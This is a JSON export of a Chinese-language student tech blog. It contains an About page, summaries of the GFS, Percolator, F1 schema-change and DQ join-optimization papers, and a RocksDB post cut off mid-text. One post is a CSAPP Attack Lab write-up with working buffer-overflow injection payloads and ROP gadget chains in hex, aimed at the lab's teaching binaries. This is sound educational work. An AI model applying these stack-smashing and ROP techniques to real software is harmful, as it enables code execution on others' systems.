{"pages":[],"posts":[{"title":"About me","text":"Education 武汉大学，软件工程，本科，2017.09~2021.06 华中科技大学，计算机系统结构，硕士，2021.09~2024.06(预期) Interest 数据库 存储系统 分布式系统 Skill 会写一点点Go/Rust/C++/Python 懂得一点点数据结构与算法 了解一点点系统知识基础 熟悉一点点Linux操作系统 Contact iggiewang@gmail.com","link":"/2021/01/16/About-me/"},{"title":"Attack Lab","text":"本文记录 CSAPP 的 Attack Lab 完成方案。 1. ctarget 部分Level 1level 1 要求我们在 getbuf 输入字符串后，利用溢出来重写栈中 getbuf 函数返回的地址，让函数调用 touch1。 12345670000000000401713 &lt;getbuf&gt;: 401713: 48 83 ec 38 sub $0x38,%rsp 401717: 48 89 e7 mov %rsp,%rdi 40171a: e8 3b 02 00 00 callq 40195a &lt;Gets&gt; 40171f: b8 01 00 00 00 mov $0x1,%eax 401724: 48 83 c4 38 add $0x38,%rsp 401728: c3 retq 根据这段汇编代码我们可以确定，getbuf 在栈中分配了0x38比特的内存来存储输入的字符串。如果我们输入的字符串长度超过 56，就可以覆盖掉 getbuf 的返回地址了，所以，我们只需要把输入的第 56-63 个字符填写为 touch1 函数的地址就行了。需要注意的是，我们输入的字符应该用两位十六进制数来表示，然后通过 hex2raw 来将其转换成字符串。另外，我这里数据都是用小端法来保存的，所以低位在前： 1234567800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 29 17 40 00 00 00 00 00 Level 2level 2 要求我们注入我们自己写的代码，并把程序转移到我们写的代码处运行，也就是执行 touch2。如何通过我们的代码跳转到 touch2 函数？首先，我们需要找到缓冲区的起始地址，在 getbuf 处打断点，查看 $rsp： 12(gdb) p $rsp$1 = (void *) 0x5565fd40 可以知道，0x5565fd40 - 0x38 = 0x5565fd08 就是缓冲区的起始地址，我们需要和前面的 level 1 一样，让缓冲区溢出，56-63 个字符填写为缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码，这样程序才能执行我们想要的结果。我们注入的代码逻辑应该是： 将 cookie 值赋给 %edi 作为 touch2 函数的参数 将 touch2 函数的地址入栈 ret，让函数执行 touch2 转为汇编就是： 123movl $0x2a2e4a08, %edipushq $0x0000000000401755ret 这里需要用到 gcc 内联汇编的方法，编写 level2.c : 12345678910int main(void){ asm ( &quot;movl $0x2a2e4a08, %edi\\n\\t&quot; &quot;pushq $0x0000000000401755\\n\\t&quot; &quot;ret&quot; ); return 0;} 编译并查看其反汇编代码： 12gcc level2.c -o level2.outobjdump -d level2.out 可以看到我们想要的汇编代码： 1234004f1: bf 08 4a 2e 2a mov $0x2a2e4a08,%edi4004f6: 68 55 17 40 00 pushq $0x4017554004fb: c3 retq 那么我们在缓冲区注入字符就是： 12345678bf 08 4a 2e 2a 68 55 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 fd 65 55 00 00 00 00 Level 3level 3 要求我们执行 touch3，touch3 接收的参数是 cookie 的字符串的地址。有了 level 2 的经验，我们知道需要在 56-63 个字符填写缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码。我们把 cookie 字符串放在第 64-71 个字符，这样，我们注入的代码就是： 123movl $0x5565fd48, %edipushq $0x0000000000401829ret 0x5565fd08 + 64 = 0x5565fd48 是 cookie 字符串的地址，0x0000000000401829 是 touch3 函数地址。同样地，用 gcc 内联汇编的方法得到汇编代码，最终我们在缓冲区注入字符就是： 123456789bf 48 fd 65 55 68 29 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 fd 65 55 00 00 00 0032 61 32 65 34 61 30 38 2. rtarget 部分Level 2与之前的 level 2 相同，我们需要为 %rdi 赋上 cookie 值，再跳转到 touch2 函数执行，跳转到 touch2 只需要将 touch2 的入口地址放在最后一个 gadget 之后，在它的 ret 指令执行之后就会返回到 touch2 中。查看 farm.s： 123000000000000001b &lt;getval_188&gt;: 1b: b8 3c cd 58 c3 mov $0xc358cd3c,%eax 20: c3 retq 58 c3 对应 popq %rax，这条指令的地址是 0x1b + 3 = 0x1e。 1230000000000000028 &lt;setval_279&gt;: 28: c7 07 48 89 c7 c3 movl $0xc3c78948,(%rdi) 2e: c3 retq 48 89 c7 c3 对应 movq %rax,%rdi，这条指令的地址是 0x28 + 2 = 0x30。再查看 rtarget.s： 12300000000004018b1 &lt;start_farm&gt;: 4018b1: b8 01 00 00 00 mov $0x1,%eax 4018b6: c3 retq start_farm 的起始地址是 0x4018b1。所以 popq %rax 这条指令最终的地址是 0x1e + 0x4018b1 = 0x4018cf；所以 movq %rax,%rdi 这条指令最终的地址是 0x30 + 0x4018b1 = 0x4018e1。level 2(rtarget) 最终结果为： 123456789101100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cf 18 40 00 00 00 00 00 /* popq %rax */08 4a 2e 2a 00 00 00 00 /* 将 cookie 存入 %rax */e1 18 40 00 00 00 00 00 /* movq %rax,%rdi */55 17 40 00 00 00 00 00 /* 返回到 touch2 */ Level 3与之前的 level 3 相同，需要将 %rdi 指向 cookie 的字符串表示的首地址。我们需要把 cookie 字符串放在高地址，根据 %rsp 和偏移量去取地址。在 farm.s 中： 1230000000000000042 &lt;add_xy&gt;: 42: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 46: c3 retq lea (%rdi,%rsi,1) %rax 就是 %rax = %rdi + %rsi，所以，只要能够让 %rdi 和 %rsi 其中一个保存 %rsp，另一个保存偏移量，就可以计算出 cookie 存放的地址，然后 movq %rax,%rdi 再调用 touch3 就可以了。所以，分两步走：先保存一个栈顶地址，这里我通过 %rsp -&gt; %rax -&gt; %rdi 保存到 %rdi 中，再将偏移量通过 %eax(%rax) -&gt; %ecx -&gt; %edx -&gt; %esi 保存到 %esi(%rsi) 中。注意，偏移量的值需要等所有指令写完后才能确定。level 3(rtarget) 最终结果为： 1234567891011121314151617181900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1e 19 40 00 00 00 00 00 /* movq %rsp,%rax (48 89 e0) */e1 18 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) */cf 18 40 00 00 00 00 00 /* popq %rax (58) *//* %rdi中保存的是 movq %rsp,%rax 这条指令的栈顶地址，所以最终偏移量为 0x48 */48 00 00 00 00 00 00 00 /* 偏移量 */58 19 40 00 00 00 00 00 /* movl %eax,%ecx (89 c1) */7a 19 40 00 00 00 00 00 /* movl %ecx,%edx (89 ca) */0c 19 40 00 00 00 00 00 /* movl %edx,%esi (89 d6) */f3 18 40 00 00 00 00 00 /* add_xy */e1 18 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) */29 18 40 00 00 00 00 00 /* touch3地址 */32 61 32 65 34 61 30 38 /* 目标字符串 */ 最终结果123456789101112131415161718192021222324252627282930[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-ctarget.l1 | ./ctargetCookie: 0x2a2e4a08Type string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-ctarget.l2 | ./ctargetCookie: 0x2a2e4a08Type string:Touch2!: You called touch2(0x2a2e4a08)Valid solution for level 2 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-ctarget.l3 | ./ctargetCookie: 0x2a2e4a08Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)Valid solution for level 3 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-rtarget.l1 | ./rtargetCookie: 0x2a2e4a08Type string:Touch2!: You called touch2(0x2a2e4a08)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-rtarget.l2 | ./rtargetCookie: 0x2a2e4a08Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! repoMy solutions to CSAPP labs","link":"/2021/01/21/Attack-Lab/"},{"title":"Google File System","text":"背景GFS 是 Google 针对大数据处理场景设计的分布式文件系统，Google 对数据量的持续增长的设想如下： 需要能够运行在经常故障的物理机环境上。只有做到这点，这个系统才能运行在几百到上千台规模下，并采用相对便宜的服务器硬件 大文件居多。存储在 GFS 上的文件的不少都在几个 GB 这样的级别 大多数写是append写，即在文件末尾追加 性能主要考量是吞吐而不是延时 接口GFS 以目录树的形式组织文件，但是并没有提供类似 POSIX 标准的文件系统操作。操作只要包含 create, open, write, read, close, delete, append, snapshot，其中 snapshot 用于快速复制一个文件或者目录，允许多个客户端并行追加数据到一个文件。 架构整体架构上，GFS 由单一的 master 节点、chunkserver 和提供给用户的 client 三大部分组成： client 与 chunkserver 都不会缓存文件数据，为的是防止数据出现不一致的状况，但是 client 会缓存 metadata 的信息。 master一方面存储所有的 metadata，负责管理所有的元信息，包括表示文件系统目录结构的 namespace、访问控制信息、文件与 chunk 的映射关系、chunk 的位置信息；另一方面管理 chunk 租约、chunk 迁移(如果 chunkserver 挂掉)、维护与 chunkserver 之间的心跳。 namespace 采用全内存的数据结构，以提高访问的吞吐 namespace 是一个查找表(lookup table)，并且采用了前缀压缩的方式存储在内存中，它是一个树结构，树中每一个节点(文件名或目录名)都有一个读/写锁。在对文件或目录操作的时候需要获取锁，例如修改 /root/foo/bar，需要获得 /root、/root/foo 的读锁，/root/foo/bar 的写锁 master 本身并不记录 chunk 的位置，而是在启动的时候，通过收取 chunkserver 的信息来构建。这种设计避免了 master 和 chunkserver 的信息不一致的问题(因为以 chunkserver 为准) master 和 chunkserver 通过定期心跳来保持信息同步、感知 chunkserver 故障等 master 往磁盘上写操作日志，并将这些日志同步到其他物理机保存的方式来确保数据安全性。当前 master 机器故障的时候，可以通过这些日志和 chunkserver 的心跳内容，可以恢复到故障前的状态 对于操作日志，会定期在系统后台执行 checkpoint；checkpoint 构建成一个类似B+树、可以快速的 load 到内存中直接使用的结构 master 需要定期检查每个 chunk 的副本情况，如果副本低于配置值，就需要将通知 chunkserver 进行复制；如果存在一些多余的 chunk (file 已经被删除了)，就需要做一些清理工作 chunkserver每个 chunk 有一个 64 位标识符(chunk handle)，它是在 chunk 被创建时由 master 分配的，每一个 chunk 会有多个副本，分别在不同的机器上，每个副本会以 Linux 文件的形式存储在 chunkserver 的本地磁盘上。GFS 中将 chunk 的大小定为 64 MB，它比一般的文件系统的块大小要大。优点：减少 metadata 的数量、减少 client 与 master 的交互、client 可以在一个 chunk 上执行更多的操作，通过 TCP 长连接减少网络压力；缺点：如果在一个 chunk 上有一个可执行文件，同时有许多 client 都要请求执行这个文件，它的压力会很大。chunk 的位置信息在 master 中不是一成不变的，master 会通过定期的 heartbeat 进行更新，这样做能够减小开销，这样做就不用 master 与 chunkserver 时刻保持同步通信(包括 chunkserver 的加入、退出、改名、宕机、重启等)。chunkserver 上有一个 final word，它表示了哪个 chunk 在它的磁盘上，哪个 chunk 不在。 一致性模型 defined：状态已定义，从客户端角度来看，客户端完全了解已写入集群的数据consistent：客户端来看chunk多副本的数据完全一致，但不一定defined 串行写：客户端自己知道写入文件范围以及写入数据内容，且本次写入在数据服务器的多副本上均执行成功，每个客户端的写操作串行执行，因此最终结果是 defined 并行写：每次写入在数据服务器的多副本上均执行成功，所以结果是 consistent，但客户端无法得知写操作的执行顺序，即使每次操作都成功，客户端无法确定在并发写入时交叉部分，所以是 undefined 追加写：客户端能够根据 offset 确切知道写入结果，无论是串行追加还是并发追加，其行为是 defined，追加时至少保证一次副本写成功，如果存在追加失败，则多个副本之间某个范围的数据可能不一致，因此是 interspersed with inconsistent。 GFS 租约GFS 使用租约机制 (lease) 来保障 mutation (指的是改变了 chunk 的内容或者 metadata，每一次 mutation 都应该作用于所有的备份) 的一致性：多个备份中的一个持有 lease，这个备份被称为 primary replica (其余的备份为 secondary replicas)，GFS 会把所有的 mutation 都序列化(串行化)，让 primary 执行，secondary 也按相同顺序执行，primary 是由 master 选出来的，一个 lease 通常 60 秒会超时。 写流程 client 向 master 请求持有 lease 的 chunk (primary replica) 位置和其他 replicas 的位置(如果没有 chunk 持有 lease，那么 master 会授予其中一个 replica 一个 lease) master 返回 primary 的信息和其他 replicas 的位置，然后 client 将这些信息缓存起来(只有当 primary 无法通信或者该 primary replica 没有 lease 了，client 才会向 master 再次请求) client 会将数据发送到所有的 replicas，每个 chunkserver 会把数据存在 LRU 缓存中 在所有的 replicas 都收到了数据之后，client 会向 primary 发送写请求。primary 会给它所收到的所有 mutation 分配序列号(这些 mutation 有可能不是来自于同一个 client)，它会在自己的机器上按序列号进行操作 primary 给 secondaries 发送写请求，secondaries 会按相同的序列执行操作 secondaries 告知 primary 操作执行完毕 primary 向 client 应答，期间的错误也会发送给 client，client 错误处理程序 (error handler) 会重试失败的 mutation 读流程 client 向 master 发出 A 文件的读请求 master 收到后返回 A 文件的 chunk handler 和 chunk 的位置 client 携带 chunk handle 以及位偏移向对应的 chunkserver 发出请求 chunkserver 读取并返回数据至 client 参考 Ghemawat, Sanjay, Howard Gobioff, and Shun-Tak Leung. “The Google file system.” (2003).","link":"/2021/01/30/Google-File-System/"},{"title":"Learning to Optimize Join Queries With Deep Reinforcement Learning","text":"Background传统的多表 join 算法采用的是动态规划： 从初始 query graph 开始 找到 cost 最少的 join 更新 query graph 直到只剩下一个节点。但这种贪心策略并不会保证一定会选到合适的 join order，因为它只直观表示了每个 join 的短期cost。例如： 动态规划的结果 cost 为 140，而最优解的 cost 为 110。 Learning to Optimize Join Queries With Deep Reinforcement Learning 论文中将 join 问题表示为马尔可夫决策过程（MDP），然后构建了一个使用深度 Q 网络（DQN）的优化器，用来有效地优化 join 顺序。 Method将连接排序表示为 MDP： 状态G：a query graph 动作c：a join 下一个状态G’：join后的query graph 奖励J(c)：join的估算成本 用 Q-Learning 算法来解决 join 顺序 MDP。在 Q-Learning 中最关键的是得到 Q 函数 Q(G,c)，它可以知道当前 query graph 中进行每个 join 的长期cost。如果我们可以访问真正的 Q(G,c)，就可以对传统的动态规划进行改进： 从初始 query graph 开始 找到 Q(G,c) 值最小的 join 更新 query graph 直到只剩下一个节点，从而得到最优的 join order。实际上我们无法访问真正的 Q 函数，因此，我们需要训练一个神经网络，它接收 (G,c) 作为输入，并输出估算的 Q(G,c)。在论文中算法如下，给定query： 状态 G 和动作 c 的特征化 query graph 中的每个关系的所有属性放入集合 A-G 中；join 左侧的所有属性放入集合 A-L 中；join 右侧的所有属性放入集合 A-R 中。并使用 1-hot 向量来编码。对于该例子，论文中表示如下： 对于查询中的每个选择，我们可以获得 selectivity ∈ [0,1]（用来估计选择后存在的元组占选择前总元组的比例），我们需要根据 selectivity 的值去更新向量。例如： 还可以根据在物理计划中选择的具体 join 算法去产生新的 1-hot 向量（例如，IndexJoin 为 [1 0], HashJoin 为 [0 1]）,与原向量进行串联，如下： 根据在论文 2.5 节的假设： 在这里我们就可以知道 query graph 特征 fG 为 fG = AG，join 决策特征 fc 为 fc = A-L ⊕ A-R，对于一个特定的元组（G,c）特征化为 fG ⊕ fc。 模型训练DQ 使用多层感知机（MLP）神经网络来表示 Q 函数。它以（G,c）的最终特征化 fG ⊕ fc 作为输入。在实验中发现，两层的 MLP 可以提供最佳表现。模型使用随机梯度下降算法进行训练。 执行训练后，在原有基础上再对多表 join 算法进行改进： 从初始 query graph 开始 使每个 join 特征化 找到模型估计的 Q 值最小的 join（即神经网络的输出） 更新 query graph 直到只剩下一个节点，从而得到最优的 join order。在执行过程中，还可以对 DQ 进行进一步微调。 Experiment Result论文中使用了 Join Order Benchmark（JOB） 来评估 DQ。这个数据库由来自 IMDB 的 21 个表组成，并提供了 33 个查询模板和 113 个查询。查询中的连接关系大小范围为 5 到 15 个。当连接关系的数量不超过 10 个时，DQ 从穷举中收集训练数据。 将 DQ 与几个启发式优化器（QuickPick 和 KBZ）以及经典动态规划（left-deep、right-deep、zig-zag）进行比较。对每个优化器生成的计划进行评分，并与最优计划（通过穷举获得）进行比较。此外，论文中设计了 3 个成本模型： Cost Model 1（Index Mostly）：模拟内存数据库并鼓励使用索引连接 Cost Model 2（Hybrid Hash）：仅考虑具有内存预算的散列连接和嵌套循环连接 Cost Model 3（Hash Reuse）：考虑重用已构建的散列表 进行了 4 轮交叉验证后，确保仅对未出现在训练工作负载中的查询进行 DQ 评估（对于每种情况，论文中在 80 个查询上训练并测试其中的 33 个）。计算查询的平均次优性，即“成本（算法计划）/ 成本（最佳计划）”，这个数字越低越好。例如，对 Const Model 1，DQ 平均距离最佳计划 1.32 倍。结果如下： 在所有成本模型中，DQ 在没有指数结构的先验知识的前提下可以与最优解决方案一比高下。对于固定的动态规划，情况并非如此：例如，left-deep 在 CM1 中产生了良好的计划，但在 CM2 和 CM3 中效果没有那么好。同样，right-deep在 CM1 中没有竞争力，但如果使用 CM2 或 CM3，right-deep 不是最差的。需要注意的是，基于学习的优化器比手动设计的算法更强大，可以适应工作负载、数据或成本模型的变化。 此外，DQ 以比传统动态规划快得多的速度产生了良好的计划： 对于最大的连接（15），DQ 的速度是穷举的 10000 倍，比 zig-zag 快 1000 倍，比 left-deep 和 right-deep 快 10 倍。 Future work本文研究中存在的不足： 奖励值（即J(c)）依赖于数据库系统的代价模型，当代价估计错误时，算法的 join 计划无法达到最优 需要大量的 query 进行训练，估计的 Q 函数的值才能趋向稳定 可以拓展的思路：同样使用强化学习，参考于 SkinnerDB: Regret-Bounded Query Evaluation via Reinforcement Learning，一条 join query 的执行框架如下： 查询时，Pre-Processor 首先通过一元谓词过滤基表，接着由 Join Processor 生成查询的连接顺序与执行结果，最后调用 Post-Processor 对结果进行分组、聚合与排序等操作。 Join Processor 包括 4 部分，Join Processor 将每个连接操作分为多个时间片，每个时间片首先由 Learning Optimizer 选择连接顺序，选中的连接顺序由特定的 Join Executor 执行，每次执行固定时长，并将执行结果加入结果集中。Progress Tracker 跟踪被处理的数据，最后由 Reward Calcultor 计算连接顺序的得分。当所有数据被连接后，完成连接操作。学习优化器使用强化学习领域的上限置信区间算法（UCT），在每个时间片中根据连接顺序的枚举空间生成搜索树，并选择一条路径。UCT 算法的特点即不依赖任何具体示例的参数设置，能够适用于较大的搜索空间。 该算法不需要任何查询上下文及 Cardinality 估计模型。","link":"/2021/02/07/Learning-to-Optimize-Join-Queries-With-Deep-Reinforcement-Learning/"},{"title":"Google Percolator","text":"背景Percolator 事务模型是 Google 内部用于 Web 索引更新的业务提出的分布式事务协议，构建在 BigTable 之上，总体来说就是一个经过优化的二阶段提交的实现。使用基于 Percolator 的增量处理系统代替原有的批处理索引系统后，Google 在处理同样数据量的文档时，将文档的平均搜索延时降低了50%。 2PC传统的 2PC 简单描述一下就是两步： 发起事务：事务管理器会发出 Prepare 请求，要求参与者记录日志，进行资源的检查和锁定 确认/取消事务：当请求得到所有参与者的成功确认后，事务管理器会发出 Commit 请求，执行真正的操作；如果第一步中只要有一个执行者返回失败，则取消事务 这样会有两个问题，一个就是单点故障：如果事务管理器发生故障，数据库会一直阻塞下去。尤其是在第二阶段发生故障的话，所有参与者还都处于锁定事务资源的状态中，从而无法继续完成事务操作；另一个就是存在数据不一致的情况：在第二阶段，当事务管理器向参与者发送 Commit 请求之后，发生了局部网络异常，导致只有部分参与者接收到请求，但是其他参与者未接到请求所以无法提交事务，整个系统就会出现数据不一致性的现象。 Percolator 事务流程Percolator 事务是一个经过优化的 2PC 的实现，进行了一个二级锁的优化，也分为两个阶段：预写（Pre-write）和提交（Commit）。另外，所有启用了 Percolator 事务的表中，每一个 Column Family 都会预先增加两个列，分别是： lock：存储事务过程中的锁信息 write：存储当前行可见（最近一次提交）的版本号 另外，为了简化场景，假设存储用户数据的列只有一个，名为 data。 Pre-write 客户端从 TSO 获取时间戳，记为 start_ts，并向 Percolator Worker 发起 Pre-write 请求。 在该事务包含的所有写操作中选取一个作为主（primary）操作，其余的作为次（secondary）操作。主操作将作为整个事务的互斥点，标记事务的状态。 先预写主操作，成功后再预写次操作。在预写过程中，对每一个写操作都要执行检查： 检查写入的行对应的 lock 列是否有锁，如果有，说明其他事务正在写，直接取消整个事务 检查写入的行对应的 write 列版本号是否晚于 start_ts，如果是，说明有版本冲突，直接取消整个事务 检查通过后，以 start_ts 作为版本号将数据写入 data 列，对操作行加锁，即更新 lock 列的锁信息：主操作行的 lock 直接标为primary，次操作行的 lock 则标为主操作行的键和列名。不更新write列，亦即此时写入的数据仍然不可见。 Commit 客户端从 TSO 获取时间戳，记为 commit_ts，并向 Percolator Worker 发起 Commit 请求。 检查主操作行对应的 lock 列所在的 primary 标记是否存在，如果不存在则失败，取消事务；如果存在则继续。 以 commit_ts 作为版本号，将 start_ts 更新到 write 列中。也就是说在本阶段完成后，预写阶段写入的数据将会可见。 对该行解锁，即删除 lock 列的 primary 信息。 若步骤 1~4 均成功，说明主操作行成功，代表整个事务实际上已经提交。接下来更新每个 secondary 即可，即重复步骤3、4的更新 write 列和清除 lock 列操作。secondary 的 commit 是可以异步进行的，只是在异步提交进行的过程中，如果此时有读请求，可能会需要做一下锁的清理工作。 案例银行转账，Bob 向 Joe 转账 7 元。该事务于 start_ts=7 开始，commit_ts=8 结束，Key 为 Bob 和 Joe 的行可能在不同的分片上。具体过程如下： 首先查询 write 列获取最新时间戳数据，获取到 data@5，然后从 data 列里面获取时间戳为 5 的数据，初始状态下，Bob 的帐户下有 10，Joe 的帐户下有 2。 事务开始，获取 start_ts=7 作为当前事务的开始时间戳，将 Bob 行选为本事务的 primary，通过写入 lock 列锁定 Bob 的帐户，同时将数据 7:$3 写入到 data 列。 同样，使用 start_ts=7，将 Joe 改变后的余额写入到 data 列，当前操作作为 secondary，因此在 lock 列写入 7:Primary@Bob.bal（当失败时，能够快速定位到 primary 操作，并根据其状态异步清理）。 事务带着当前时间戳 commit_ts=8 进入 Commit 阶段：删除 primary 所在的 lock，并在 write 列中写入以提交时间戳作为版本号指向数据存储的一个指针 data@7。至此，读请求过来时将看到 Bob 的余额为 3。 同样，使用 commit_ts=8，依次在 secondary 操作项中写入 write 列并清理锁。 至此，整个当前 Percolator 事务已完成。 对比相比 2PC 存在的问题，来看看 Percolator 事务模型有哪些改进。 单点故障Percolator 通过日志和异步线程的方式弱化了这个问题。一是，Percolator 引入的异步线程可以在事务管理器宕机后，回滚各个分片上的事务，提供了善后手段，不会让分片上被占用的资源无法释放。二是，事务管理器可以用记录日志的方式使自身无状态化，日志通过共识算法同时保存在系统的多个节点上。这样，事务管理器宕机后，可以在其他节点启动新的事务管理器，基于日志恢复事务操作。 数据不一致2PC 的一致性问题主要缘自第二阶段，不能确保事务管理器与多个参与者的通讯始终正常。但在 Percolator 的第二阶段，事务管理器只需要与 primary 操作所在的一个节点通讯，这个 Commit 操作本身就是原子的。所以，事务的状态自然也是原子的，一致性问题被完美解决了。 Snapshot Isolation传统关系型数据库中定义的隔离级别有4种（RU、RC、RR、S），而 Percolator 事务模型提供的隔离级别是快照隔离（Snapshot Isolation, SI），它也是与 MVCC 相辅相成的。SI的优点是： 对于读操作，保证能够从时间戳/版本号指定的稳定快照获取，不会发生幻读 对于写操作，保证在多个事务并发写同一条记录时，最多只有一个会提交成功 如图，基于快照隔离的事务，开始于 start timestamp（图内为小空格），结束于 commit timestamp（图内为小黑球）。本例包含以下信息： txn_2 不能看到 txn_1 的提交信息，因为 txn_2 的开始时间戳 start timestamp 小于 txn_1 的提交时间戳 commit timestamp txn_3 可以看到 txn_2 和 txn_1 的提交信息 txn_1 和 txn_2 并发执行：如果它们对同一条记录进行写入，至少有一个会失败 参考 Peng D, Dabek F, Inc G . “Large-scale Incremental Processing Using Distributed Transactions and Notifications” (2010).","link":"/2021/02/09/Google-Percolator/"},{"title":"Online, Asynchronous Schema Change in F1","text":"背景分布式数据库 Schema 变更时，由于 Server 获取 Schema 元数据的时机不是同步的，不可避免地会使同一时刻一些 Server 上的 Schema 是旧的，如下图所示。而若变更时禁止 DML 让所有的 Server 都暂停服务，对于大规模分布式数据库，基本没法做到，因为 Schema 变更操作需要花费大量时间，而数据库需要保证 24 小时在线。 例如，增加一个索引 E，Schema 从 S1 变为 S2，有两个节点 A 和 B 分别使用 S1 和 S2： B 添加一行数据，由于它按照 Index E 已经创建完成的 Schema，它会插入两个 KV，RowKV 和 IndexKV A 删除该行数据，由于它按照 Index E 未创建的 Schema，它只会删除 RowKV，IndexKV 就成了孤儿，破坏了数据的完整性 论文思路论文提出了一种 Schema 演进的协议，协议有两个特点： Online——Schema 变更期间，所有 Server 仍然可以读写全部数据 Asynchronous——允许不同 Server 在不同时间点开始使用新版本 Schema 论文把从 Schema 0 到 Schema 1 的突变，替换为一系列相互兼容的小状态变化： 任意两个相邻的小状态（版本）都是兼容的 只有一个 Server 负责 DDL 的执行，其他 Server 只是定期刷新状态（拉取 Schema） 每次 Schema 版本变化间隔不小于一个 Lease 时间，任意时刻，集群中 Server 至多存在两个版本的 Schema。也就是说所有 Server 使用的 Schema 状态都相邻，都是兼容的，经过一系列小状态的转换，就可以实现 Schema 0 到 Schema 1 的变更 schema elements 包括 tables，columns，indexes，constraints，和 optimistic locks 每个 schema element 都有一个与之关联的 state states Absent 状态 完全不感知该 schema element，任何 DML 都不会涉及该 schema element Delete Only 状态 Select 语句不能使用该 schema element Delete 语句在删除时，如果​该 schema element​ 对应的条目存在，要一并删除 Insert 语句在插入​时，不允许插入该 schema element​ 对应的条目 Update 语句在修改时，只允许删除既存的该 schema element​ 对应的条目，但不能插入新的该 schema element​ 对应的条目 Write Only 状态 Select 语句不能使用该 schema element 其他 DML 语句可以正常使用该 schema element、修改该 schema element​ 对应的条目 Reorg 不是一种 schema 状态，而是发生在 write-only 状态之后的一系列操作，保证在索引变为 public 之前所有旧数据的 schema element 都被正确地生成 reorg 要做的就是取到当前时刻的 snapshot，为每条数据补写对应的 schema element 条目即可。当然 reorg 开始之后数据可能发生变更，这种情况下底层 Spanner 提供的一致性能保证 reorg 的写入操作要么失败（说明新数据已提前写入），要么被新数据覆盖 Public 状态 该 schema element 正常工作，所有 DML 都正常使用该 schema element 状态兼容说明 破坏一致性（兼容性）的场景有两种： orphan data anomaly：数据库中包含了按照当前 schema 下不应存在的 KV integrity anomaly：数据库中缺少当前 schema 下应该存在的 KV 为什么 “Absent” 和 “Delete Only” 能够兼容 Absent 状态的 Server 不知道该 schema element 因此不需要该 schema element，不会产生该 schema element 的条目 Delete Only 状态的 Server 知道该 schema element（非 public）但也不需要该 schema element，不会产生该 schema element 的条目 为什么 “Delete Only” 和 “Write Only” 能够兼容 Delete Only 状态和 Write Only 状态的 Server 都知道该 schema element（非 public）但都不需要该 schema element 为什么 “Write Only” 和 “Public” 能够兼容 Write Only 状态的 Server 在该 schema element 的所有已经完整的情况下（通过 Reorg），可以与 Public 兼容 为什么 “Absent” 和 “Write Only” 不兼容 因为 Write Only 会产生新的条目，破坏了 Absent 的条件 为什么 “Delete Only” 和 “Public” 不兼容 因为 Public 有要求所有历史数据有完整的 schema element，Delete Only 状态下并不具备 通俗点举例 假设在增加一个索引 E 的过程中，有如下执行顺序：1）Server A 插入一行 x；2) Server B 删除了行 x；3）Server A 查询 y；4) Server B 查询 y： (1) A 为 Delete Only 状态，B 为 Absent 状态：A 插入了一个 KV（RowKV），B 将 RowKV 删除，A 和 B 在查询时都不会用到 Index E，是兼容的 (2) A 为 Write Only 状态，B 为 Delete Only 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 将 RowKV 和 IndexKV 删除，A 和 B 在查询时都不会用到 Index E，是兼容的 (3) A 为 Public 状态，B 为 Write Only 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 将 RowKV 和 IndexKV 删除；查询时，A 会用到 Index E，B 虽然不会用到 Index E，但数据库中存在 A 的 schema 下应该存在的 IndexKV，所以是兼容的 (4) A 为 Write Only 状态，B 为 Absent 状态：A 插入了两个 KV（RowKV 和 IndexKV），B 感知不到 IndexKV，因此只会删除 RowKV，这一行的 IndexKV 就成了孤儿数据，所以不兼容 (5) A 为 Public 状态，B 为 Delete Only 状态：A 会用到 Index E，B 不会用到 Index E，并且数据库中也不存在 A 的 schema 下的 IndexKV，所以不兼容 参考 Ian Rae, Eric Rollins, Jeff Shute, Sukhdeep Sodhi and Radek Vingralek, Online, Asynchronous Schema Change in F1, VLDB 2013.","link":"/2021/02/13/Online-Asynchronous-Schema-Change-in-F1/"},{"title":"RocksDB WriteImpl 流程","text":"本文对 RocksDB 6.7.3 版本的 WriteImpl 流程进行分析。 概述RocksDB 写入实现主要在 DBImpl::WriteImpl 中，过程主要分为以下三步： 把 WriteBatch 加入队列，多个 WriteBatch 成为一个 WriteGroup 将该 WriteGroup 所有的记录对应的日志写到 WAL 文件中 将该 WriteGroup 所有的 WriteBatch 中的一条或者多条记录写到内存中的 Memtable 中 其中，每个 WriteBatch 